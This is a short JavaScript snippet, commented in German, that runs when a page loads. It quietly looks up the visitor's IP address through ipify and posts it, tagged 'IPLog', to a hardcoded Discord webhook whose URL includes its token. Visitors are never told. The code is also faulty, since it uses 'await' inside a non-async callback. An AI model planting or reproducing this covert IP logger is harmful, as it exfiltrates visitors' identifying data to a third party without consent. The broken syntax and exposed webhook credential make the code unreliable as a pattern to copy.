document.addEventListener('DOMContentLoaded', function () {
    // Funktion zum Abrufen der IP-Adresse vom externen Dienst
    function getIP() {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const webhookURL = "https://discord.com/api/webhooks/1341492607540531300/4TEP1k5ugnO6ioqiKcXbOKeNH-PmgT9G7NzeY_9s9-8yK0ad5pDXvsw9noNzwvHmFxMy"
                let ip = data.ip;
                const content = {};
                content.content = "New access: " + ip;
                content.username = "IPLog";

                try {
                    const request = await fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(content)
                    });
                } catch (error) {
                    console.warn("error occurred whilst sending message");
                    alert("error");
                }
            });
    }

    getIP();
});
